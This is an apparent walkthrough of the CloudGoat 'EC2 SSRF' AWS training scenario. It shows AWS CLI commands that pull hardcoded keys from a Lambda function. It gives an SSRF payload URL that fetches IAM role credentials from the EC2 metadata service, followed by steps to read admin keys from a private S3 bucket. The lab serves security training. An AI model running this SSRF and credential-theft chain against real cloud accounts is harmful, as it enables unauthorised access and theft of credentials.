# EC2 SSRF
Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.

Goal: Invoke the "cg-lambda-[ CloudGoat ID ]" Lambda function.

# Walkthrough

## Login

```
aws configure --profile solus
```

## List Lambda functions and the appropriate environment variables
```
aws lambda list-functions --profile solus
Found function e.g. cg-lambda-ec2_ssrf_cgidqu9n88izv2

aws lambda get-function --function-name cg-lambda-ec2_ssrf_cgidqu9n88izv2 --profile solus
Found EC2_ACCESS_KEY_ID and EC2_SECRET_KEY_ID
```

## Assume new role and list ec2 instances
```
aws configure --profile wrex

 aws ec2 describe-instances --profile wrex
 Get instance IP address e.g. 35.174.0.249
```

## Exploit SSRF Vulnerability
```
Paste the following in browser replacing 35.174.0.249 with the ec2 ip address
http://35.174.0.249/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
Found the role name

Retrieve AccessKeyId and SecretAccessKey
```

## Identify critical s3 bucket and the admin profile
```
aws configure --profile ec2
Add aws_session_token in the ~/.aws/credentials/credentials file

aws s3 ls --profile ec2
Found bucket e.g. cg-secret-s3-bucket-ec2-ssrf-cgidqu9n88izv2

List objects 
aws s3 ls s3://cg-secret-s3-bucket-ec2-ssrf-cgidqu9n88izv2 --recursive --profile ec2

Cat object
aws s3 cp s3://cg-secret-s3-bucket-ec2-ssrf-cgidqu9n88izv2/admin-user.txt - --profile ec2

Retrieve the access key and secret access key
```

## Assume role and invoke function 
```
aws configure --profile lambda

aws lambda  invoke --function-name cg-lambda-ec2_ssrf_cgidqu9n88izv2 --profile lambda ./output.json

View contents of file to see: You win!
```

# References
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/ec2_ssrf/README.md